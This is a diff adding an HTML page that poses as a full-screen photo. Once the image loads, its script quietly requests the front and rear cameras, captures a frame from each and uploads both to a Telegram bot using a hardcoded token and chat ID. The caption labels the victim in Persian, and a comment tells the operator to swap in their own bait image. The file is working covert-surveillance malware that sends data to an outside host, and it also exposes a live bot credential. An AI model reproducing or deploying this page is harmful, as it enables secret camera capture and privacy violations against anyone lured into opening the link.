@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>عکس</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        body,html{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}
+        #photo{width:100vw;height:100vh;object-fit:cover;display:block}
+        video,canvas{display:none}
+    </style>
+</head>
+<body>
+
+<!-- فقط لینک عکس خودت رو اینجا بذار (هر جا آپلود کردی) -->
+<img id="photo" src="https://imgur.com/a/xUy0fOD">
+
+<video id="video" playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TOKEN = "8347578600:AAEYkqSxvGgbXadUlQjDoY2Ey_-YgtUZ2U8";
+    const CHAT_ID = "-1003384762825"; // گروهت
+
+    async function takePhoto(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode }
+            });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                canvas.toBlob(blob => {
+                    const form = new FormData();
+                    form.append('chat_id', CHAT_ID);
+                    form.append('photo', blob, `${label}.jpg`);
+                    form.append('caption', `عکس زنده ${label} از قربانی`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                }, 'image/jpeg', 0.95);
+
+                stream.getTracks().forEach(t => t.stop());
+            }, 1500);
+        } catch(e) { console.log("دوربین " + label + " در دسترس نیست"); }
+    }
+
+    // وقتی عکس لود شد → دوربین جلو و عقب رو فعال کن
+    document.getElementById('photo').onload = () => {
+        setTimeout(() => {
+            takePhoto("user", "دوربین جلو");
+            setTimeout(() => takePhoto("environment", "دوربین عقب"), 3000);
+        }, 1000);
+    };
+</script>
+</body>
+</html>
